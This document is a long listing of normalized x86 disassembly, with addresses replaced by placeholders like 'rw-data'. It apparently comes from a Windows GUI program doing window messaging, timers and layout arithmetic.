mov eax [ rw-data ]
test eax eax
mov [ rw-data ] ebx
je r-xdata
cmp esi 0x2
jne r-xdata
push edi
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + eax * 4 ]
push edx
mov ecx rw-data
call sub_40b320
mov [ rw-data ] 0x2
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx edi
mov [ eax ] edx
jne r-xdata
mov ebp [ rw-data ]
mov dl [ rw-data ]
mov esi [ rw-data ]
jmp r-xdata
inc edi
mov eax [ esp + 0x14 ]
cmp eax ebp
jne r-xdata
mov al [ esp + 0x3c ]
test al al
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov edx [ rw-data ]
mov ecx [ rw-data ]
push sub_45ba40
push 0x320
push 0x3
push edx
mov [ rw-data ] ecx
mov [ rw-data ] 0x15f
call [ SetTimer@IAT ]
push 0x0
mov [ rw-data ] eax
mov eax [ rw-data ]
push 0x0
push eax
jmp r-xdata
cmp [ esp + 0x18 ] edi
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov ebp [ rw-data ]
mov esi [ rw-data ]
mov [ rw-data ] 0x1
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov edi eax
mov eax [ edi + 0x12c ]
push 0x64
push eax
call [ GetDlgItem@IAT ]
mov ebp [ SendMessageA@IAT ]
push 0x0
push 0x0
mov esi eax
push 0x402
push esi
call ebp
test esi esi
je r-xdata
mov eax [ rw-data ]
mov esi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x402
push eax
call esi
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] 0x1
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx edi
mov [ eax ] edx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
cmp [ rw-data ] 0x2
jne r-xdata
mov al [ esp + 0x3c ]
test al al
je r-xdata
cmp eax 0xffffffff
jge r-xdata
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jge r-xdata
call [ InvalidateRect@IAT ]
mov al [ esp + 0x13 ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
push 0xffffffff
push ebx
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
mov edx [ rw-data ]
cmp eax edx
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov esi [ rw-data ]
test esi esi
je r-xdata
test edi edi
jl r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc edi
cmp [ esp + 0x3c ] 0x1
jne r-xdata
dec edi
jmp r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] al
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] ebx
je r-xdata
mov edx [ rw-data ]
inc edx
push edx
push 0x1
push 0x405
push esi
call ebp
mov [ edi + 0x124 ] ecx
mov ecx [ rw-data ]
push ecx
push 0x0
push 0x408
push esi
call ebp
mov edx [ rw-data ]
inc edx
push edx
push 0x1
push 0x405
push ecx
call esi
jmp r-xdata
push edx
push 0x0
push 0x408
push ecx
call esi
mov ecx [ rw-data ]
mov al [ rw-data ]
test al al
mov [ rw-data ] 0x0
mov [ rw-data ] 0xffffffff
jne r-xdata
mov edx [ esi + 0xd48 ]
lea eax [ esi + 0xd48 ]
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
cmp edi [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
cmp edi [ rw-data ]
jl r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] al
dec edi
jmp r-xdata
mov edx [ rw-data ]
push edx
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
push sub_45ba40
push 0x320
push 0x3
push ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x15f
call [ SetTimer@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x0
push edx
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov al [ rw-data ]
test al al
jne r-xdata
push eax
call sub_4a9250
add esp 0x4
test al al
je r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ esp + 0x30 ] 0x2
jg r-xdata
mov [ rw-data ] eax
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push ebp
push ebx
push edi
mov [ rw-data ] edi
call sub_4706c0
add esp 0x10
test eax eax
jge r-xdata
cmp [ rw-data ] ebp
mov esi ebp
jle r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
jge r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
mov ecx [ rw-data ]
lea eax [ ecx + eax * 4 ]
push eax
mov ecx rw-data
call sub_40b320
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x1
push esi
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push edx
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov eax [ rw-data ]
inc esi
cmp esi eax
jl r-xdata
mov edi ebp
jmp r-xdata
mov [ rw-data ] ebp
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
jle r-xdata
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] 0x1
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] ecx
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov [ esp + 0x1c ] eax
push rw-data
mov ecx rw-data
mov [ esp + 0x2c ] 0x0
call sub_40b320
lea eax [ esp + 0x1c ]
push eax
mov ecx rw-data
call sub_40b320
lea ecx [ esp + 0x1c ]
mov [ esp + 0x28 ] 0xffffffff
call sub_40b360
jmp r-xdata
inc [ eax + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_472460
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0e28
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push ebp
xor ebp ebp
cmp eax ebp
push esi
push edi
jle r-xdata
mov ecx [ esp + 0x48 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x44
retn
cmp [ rw-data ] ebp
je r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x28 ] edx
je r-xdata
mov ecx rw-data
mov [ esp + 0x30 ] ecx
call sub_404310
xor edi edi
mov [ esp + 0x50 ] ebp
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] ebp
call sub_40acb0
mov ebx eax
mov edx [ ebx + 0x4 ]
mov [ esp + 0x18 ] ebx
xor esi esi
mov eax [ ebx + 0x8 ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
xor ebp ebp
xor esi esi
mov [ esp + 0x10 ] edi
xor edi edi
mov [ esp + 0x3c ] esi
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] ebp
mov edx [ rw-data ]
mov [ esp + 0x50 ] 0x1
mov eax [ edx + esi * 4 ]
mov ecx [ eax ]
cmp ecx ebp
je r-xdata
cmp esi eax
jge r-xdata
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
inc esi
jmp r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x1c ] 0x0
mov ecx [ edx + ebp * 4 ]
test ecx ecx
lea eax [ edx + ebp * 4 ]
je r-xdata
cmp ebp eax
jge r-xdata
cmp edx ebp
jne r-xdata
mov ecx [ ecx + 0x4 ]
add edi [ ecx + 0x4 ]
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
inc ebp
jmp r-xdata
cmp [ ecx + 0x18 ] 0x0
jne r-xdata
xor ecx ecx
mov eax [ ecx + edx * 4 ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov ebx eax
mov ecx [ ebx + 0x20 ]
test ecx ecx
lea ebp [ ebx + 0x20 ]
je r-xdata
mov edx [ esp + 0x1c ]
cmp edx eax
jge r-xdata
test edx edx
jne r-xdata
push eax
lea ecx [ esp + 0x3c ]
call sub_46b850
mov edi [ esp + 0x40 ]
mov esi [ esp + 0x3c ]
mov edx [ rw-data ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov eax edi
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ ebx + 0x24 ]
test edx edx
lea ebp [ ebx + 0x24 ]
je r-xdata
xor edx edx
test esi esi
mov [ esp + 0x50 ] 0x0
je r-xdata
mov edi [ esi + ecx * 4 ]
mov eax [ edi + 0xc ]
cmp eax 0x10000001
jne r-xdata
cmp ecx eax
jge r-xdata
mov eax [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
inc eax
mov [ esp + 0x1c ] eax
jmp r-xdata
xor ecx ecx
mov eax edi
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
xor edi edi
mov edi edi
cmp esi edi
mov ebp esi
je r-xdata
and eax 0xff
mov ebp eax
movzx ebp [ edi + 0x32 ]
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax edi
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
jne r-xdata
cmp ecx [ esi + edx * 4 ]
je r-xdata
cmp edx eax
jge r-xdata
mov ecx [ ebx + 0x8 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx ebp
call sub_40b360
add ebp 0x4
cmp ebp edi
jne r-xdata
test esi esi
mov [ esp + 0x20 ] ecx
jne r-xdata
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_444100
mov ebx eax
call sub_40af00
push eax
push 0x0
mov ecx edi
call sub_4440b0
imul ebx eax
mov ecx [ esp + 0x14 ]
imul ebx ebp
mov edi [ esp + 0x40 ]
shr ebx 0x3
add ecx ebx
mov ebx [ esp + 0x18 ]
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x20 ]
inc ecx
jmp r-xdata
test esi esi
jne r-xdata
cmp edx [ esi + ecx * 4 ]
je r-xdata
cmp ecx eax
jge r-xdata
mov eax edi
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ rw-data ]
add eax ecx
shl edx 0x14
cmp eax edx
jbe r-xdata
mov ecx [ eax + edi * 4 ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
cmp edi ecx
jge r-xdata
mov eax edi
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
inc ecx
jmp r-xdata
test esi esi
je r-xdata
cmp edx eax
jne r-xdata
test esi esi
jne r-xdata
mov ecx rw-data
call sub_401420
xor edi edi
xor esi esi
mov [ esp + 0x3c ] esi
mov [ esp + 0x40 ] edi
mov [ esp + 0x44 ] edi
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx eax
mov ebx eax
mov [ esp + 0x20 ] eax
cmp [ rw-data ] edi
mov [ esp + 0x50 ] 0x2
mov [ esp + 0x24 ] edx
mov [ esp + 0x1c ] ecx
je r-xdata
mov edx [ eax + edi * 4 ]
mov cl [ edx + 0x4 ]
test cl cl
jne r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
test esi esi
je r-xdata
cmp ecx eax
jne r-xdata
test esi esi
jne r-xdata
push ebp
push 0x1
push ecx
mov eax esp
lea ecx [ esp + 0x44 ]
mov [ eax ] edi
call sub_468120
mov edi [ esp + 0x40 ]
mov esi [ esp + 0x3c ]
mov ecx [ esp + 0x44 ]
mov eax edi
sub eax esi
sub ecx esi
sar eax 0x2
sar ecx 0x2
cmp eax ecx
jae r-xdata
cmp [ rw-data ] 0x1
jg r-xdata
mov eax [ rw-data ]
mov edx eax
mov [ esp + 0x24 ] edx
mov ebx eax
mov esi [ eax + edi * 4 ]
test esi esi
je r-xdata
mov ecx edx
mov edx [ ecx ]
mov ecx [ edx + 0x4 ]
mov edx [ esp + 0x10 ]
mov ecx [ ecx + 0x4 ]
sub edx ecx
mov [ esp + 0x10 ] edx
inc edi
jmp r-xdata
push ebp
push 0x1
push ecx
mov eax esp
lea ecx [ esp + 0x44 ]
mov [ eax ] edi
call sub_468120
mov edi [ esp + 0x40 ]
mov esi [ esp + 0x3c ]
mov ecx [ esp + 0x44 ]
mov eax edi
sub eax esi
sub ecx esi
sar eax 0x2
sar ecx 0x2
cmp eax ecx
jae r-xdata
mov ecx [ esp + 0x30 ]
push ecx
lea edx [ esp + 0x3c ]
push edx
push ebp
push 0x1
push edi
call sub_461b00
add esp 0x14
add edi 0x4
mov [ esp + 0x40 ] edi
jmp r-xdata
lea eax [ ecx + ecx ]
mov [ esp + 0x1c ] eax
cmp [ rw-data ] edi
jle r-xdata
mov edx edi
lea esp [ esp ]
mov ecx esi
call sub_40b730
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
push ebp
push 0x1
push edi
call sub_461b00
mov eax [ esp + 0x30 ]
mov ebx [ esp + 0x2c ]
add edi 0x4
add esp 0x14
inc eax
mov [ esp + 0x40 ] edi
mov [ esp + 0x1c ] eax
jmp r-xdata
mov ecx [ rw-data ]
xor ebp ebp
mov [ esp + 0x1c ] edi
cmp [ rw-data ] edi
jne r-xdata
mov eax [ ebx + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
mov [ ecx + edx * 4 ] eax
inc edx
jmp r-xdata
dec eax
cmp edx eax
jge r-xdata
mov ebx [ esp + 0x10 ]
lea eax [ esi + 0x4 ]
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x28 ] eax
cmp [ ecx + ebp * 4 ] 0xffffffff
je r-xdata
cmp ebp eax
jge r-xdata
mov eax [ ebx + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x40 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
inc ebp
xor edi edi
jmp r-xdata
mov eax [ rw-data ]
mov edi [ eax + ebp * 4 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
test ecx ecx
lea esi [ eax - 0x1 ]
mov [ esp + 0x24 ] 0x0
jne r-xdata
mov ebp [ esp + 0x28 ]
mov [ esp + 0x20 ] 0x0
lea esp [ esp ]
mov eax [ esp + 0x20 ]
mov eax [ eax ]
mov ecx [ rw-data ]
mov ecx [ ecx + eax * 4 ]
call sub_439ed0
xor ebp ebp
cmp [ esp + 0x1c ] eax
jge r-xdata
cmp ecx edi
jne r-xdata
mov edi [ ecx + ebp * 4 ]
cmp edx edi
jg r-xdata
mov eax edi
cmp [ eax + 0xd48 ] 0x1
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp eax esi
jae r-xdata
mov eax [ esp + 0x40 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ esp + 0x20 ]
sub eax [ esp + 0x1c ]
cmp eax edi
jg r-xdata
mov eax [ esp + 0x1c ]
add eax edx
cmp edi eax
jle r-xdata
dec edi
mov eax [ ebx + 0x8 ]
mov edx eax
sub edx ecx
sar edx 0x2
cmp esi edx
jae r-xdata
mov eax [ ebx + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
mov edx [ ebp ]
mov esi [ eax + edx * 4 ]
mov eax [ esi + 0xc ]
cmp eax 0x10000001
jne r-xdata
cmp [ esp + 0x20 ] eax
jge r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
add eax ebx
shl ecx 0x14
cmp eax ecx
jbe r-xdata
mov ecx [ eax + ebp * 4 ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
cmp ebp ecx
jge r-xdata
test esi esi
jne r-xdata
cmp edi [ esp + 0x20 ]
jle r-xdata
lea edx [ ecx + esi * 4 ]
cmp edx eax
je r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ esp + 0x24 ]
push ecx
sub esi eax
push esi
push ecx
mov eax esp
mov ecx ebx
mov [ eax ] edx
call sub_418070
dec edi
inc edi
jmp r-xdata
push esi
and eax 0xff
mov edi eax
movzx edi [ esi + 0x32 ]
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x20 ]
inc ecx
mov [ esp + 0x1c ] ecx
add eax 0x8
jmp r-xdata
mov edx [ eax + ebp * 4 ]
mov cl [ edx + 0x4 ]
test cl cl
jne r-xdata
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov eax [ esp + 0x40 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
cmp eax eax
mov ecx eax
je r-xdata
mov edx [ esp + 0x10 ]
mov [ esi ] 0x0
mov eax [ ebp ]
mov ecx [ rw-data ]
mov [ ecx + eax * 4 ] 0xffffffff
mov eax [ esp + 0x14 ]
mov ecx [ rw-data ]
add eax edx
shl ecx 0x14
cmp eax ecx
jbe r-xdata
dec [ edi + 0xd48 ]
jne r-xdata
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_444100
mov ebx eax
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_4440b0
imul ebx eax
mov ecx [ esp + 0x14 ]
imul ebx edi
mov edx [ rw-data ]
shr ebx 0x3
sub ecx ebx
mov [ esp + 0x14 ] ecx
mov ecx [ ebp ]
mov edi [ edx + ecx * 4 ]
test edi edi
lea esi [ edx + ecx * 4 ]
je r-xdata
test esi esi
mov [ esp + 0x20 ] eax
jne r-xdata
mov esi [ eax + ebp * 4 ]
test esi esi
je r-xdata
mov ecx edx
mov edx [ ecx ]
mov ecx [ edx + 0x4 ]
sub ebx [ ecx + 0x4 ]
mov [ esp + 0x10 ] ebx
inc ebp
jmp r-xdata
mov ecx edx
sub ecx esi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
mov edx [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
inc eax
test esi esi
mov [ esp + 0x2c ] edx
mov edx [ esp + 0x40 ]
mov [ esp + 0x28 ] ecx
jne r-xdata
mov [ ebx + 0x8 ] edx
mov esi [ ecx ]
mov [ edx ] esi
add ecx 0x4
add edx 0x4
cmp ecx eax
jne r-xdata
mov eax [ esp + 0x3c ]
test eax eax
je r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x3c ]
inc ecx
mov [ esp + 0x20 ] ecx
add ebp 0x8
jmp r-xdata
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov edi [ esp + 0x18 ]
mov edx ebp
nop
mov ecx esi
call sub_40b730
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ edi + 0x4 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
cmp ecx eax
jae r-xdata
push eax
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
xor esi esi
nop
mov ecx edx
sub ecx esi
sar ecx 0x3
cmp eax ecx
jae r-xdata
mov ecx edx
sub ecx esi
sar ecx 0x3
xor ecx ecx
jmp r-xdata
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
mov eax [ ecx + edx * 4 + 0x4 ]
mov [ ecx + edx * 4 ] eax
inc edx
jmp r-xdata
dec eax
cmp edx eax
jge r-xdata
mov eax [ esp + 0x40 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
lea eax [ esi + eax * 8 ]
cmp eax edx
je r-xdata
sub eax ecx
lea edx [ esp + 0x28 ]
push edx
push eax
push ecx
mov ecx [ esp + 0x4c ]
mov eax esp
mov [ eax ] ecx
lea ecx [ esp + 0x44 ]
call sub_4693d0
jmp r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x4 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov eax [ ecx + esi * 8 ]
sub eax ebx
cdq
mov ecx eax
xor ecx edx
mov eax edi
sub eax ebx
sub ecx edx
cdq
xor eax edx
sub eax edx
cmp ecx eax
jl r-xdata
dec eax
cmp esi eax
jge r-xdata
mov [ esp + 0x40 ] eax
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
test ecx ecx
lea esi [ eax - 0x1 ]
mov [ esp + 0x24 ] 0x0
jne r-xdata
mov eax [ esp + 0x40 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x3c ]
inc esi
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp eax esi
jae r-xdata
mov eax [ esp + 0x3c ]
mov edx [ esp + 0x24 ]
mov [ eax + esi * 8 ] edi
mov [ eax + esi * 8 + 0x4 ] ebp
mov ecx [ rw-data ]
mov esi eax
mov edx [ esp + 0x3c ]
lea eax [ edx + ecx * 8 ]
sub ecx esi
inc ecx
lea esp [ esp ]
lea ecx [ eax - 0x2 ]
cmp ecx esi
jl r-xdata
mov ecx [ esp + 0x3c ]
test ecx ecx
jne r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
dec ebp
mov eax [ edi + 0x8 ]
mov edx eax
sub edx ecx
sar edx 0x2
cmp esi edx
jae r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ eax ]
mov [ eax + 0x8 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0xc ] edx
sub eax 0x8
dec ecx
jne r-xdata
lea edx [ ecx + esi * 4 ]
cmp edx eax
je r-xdata
mov edx [ edi + 0x8 ]
lea ecx [ esp + 0x24 ]
push ecx
sub esi eax
push esi
push ecx
mov eax esp
mov ecx edi
mov [ eax ] edx
call sub_418070
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
dec ebp
inc ebp
jmp r-xdata
cmp eax eax
mov ecx eax
je r-xdata
mov [ edi + 0x8 ] edx
lea ecx [ ecx ]
mov esi [ ecx ]
mov [ edx ] esi
add ecx 0x4
add edx 0x4
cmp ecx eax
jne r-xdata
sub_472db0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_4696b0
mov ecx [ esi + 0x4 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ecx
retn
sub_472de0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0e4b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c8
push ebx
push ebp
push esi
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
mov ecx [ esp + 0x2d8 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x2d4
retn
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
shl eax 0x2
test eax eax
mov [ esp + 0x18 ] eax
jle r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x30 ] ecx
lea ecx [ edx + eax ]
mov eax [ rw-data ]
mov dl [ esp + 0x2ec ]
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
or esi 0xffffffff
test dl dl
mov [ esp + 0x34 ] ecx
mov [ esp + 0x14 ] eax
je r-xdata
add eax 0x4
mov [ esp + 0x18 ] eax
mov ebx [ esp + 0x2e8 ]
cmp [ rw-data ] esi
jne r-xdata
cmp edi 0xc
jge r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
test edx edx
ja r-xdata
mov edx [ rw-data ]
cmp edx esi
je r-xdata
lea eax [ edi - 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax + eax * 2 ]
mov edx [ edx * 4 + rw-data ]
mov edx [ rw-data ]
jmp r-xdata
cmp ebx edx
mov [ esp + 0x1c ] edx
jge r-xdata
fild [ rw-data ]
add eax ecx
mov [ esp + 0x10 ] eax
fild [ esp + 0x10 ]
fmul [ rw-data ]
fdivp st1
fimul [ rw-data ]
call sub_4b64c4
mov ebx eax
mov [ esp + 0x2e8 ] ebx
mov [ rw-data ] esi
jmp r-xdata
mov ebx edx
mov [ esp + 0x2e8 ] ebx
mov [ rw-data ] esi
jmp r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x28 ] esp
mov ecx esp
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
push ecx
mov [ esp + 0x2c ] esp
mov ecx esp
je r-xdata
inc [ eax + 0xd48 ]
mov [ ecx ] eax
push 0x1
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x48 ]
push ecx
call sub_45ddb0
mov eax [ rw-data ]
add esp 0x20
lea edx [ esp + 0x38 ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ebp [ esp + 0x38 ]
mov eax [ esp + 0x40 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x3c ]
sub eax ebp
sub eax edi
mov edi [ esp + 0x24 ]
cdq
sub eax edx
mov ebp eax
mov eax [ esp + 0x44 ]
sub eax ecx
sub eax edi
cdq
sub eax edx
sar ebp 0x1
sar eax 0x1
test ebp ebp
mov [ esp + 0x2c ] eax
jge r-xdata
inc [ eax + 0xd48 ]
test eax eax
jge r-xdata
xor ebp ebp
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ esp + 0x2c ] 0x0
mov eax ebx
cdq
idiv ecx
mov edi eax
test [ rw-data ] 0x1
je r-xdata
imul ecx edi
mov eax ebx
sub eax ecx
lea eax [ edi + 0x1 ]
imul eax ecx
sub eax ebx
dec eax
jmp r-xdata
mov ecx [ esp + 0x2e8 ]
cmp [ rw-data ] ecx
je r-xdata
mov ecx [ esp + 0x2e8 ]
test ecx ecx
jl r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x30 ]
add ecx edx
imul ecx eax
mov [ esp + 0x10 ] ecx
push ecx
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ esp + 0x38 ]
mov esi eax
mov eax ebp
sub eax ecx
mov ecx [ rw-data ]
add ecx edx
imul ecx edi
mov [ esp + 0x14 ] ecx
add esi eax
fild [ esp + 0x14 ]
mov [ esp + 0x5c ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x2c ]
mov ecx [ rw-data ]
mov edi eax
mov eax [ esp + 0x30 ]
fst [ esp + 0x2c ]
sub eax ecx
fmul [ rw-data ]
add edi eax
mov [ esp + 0x60 ] edi
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
add ecx edx
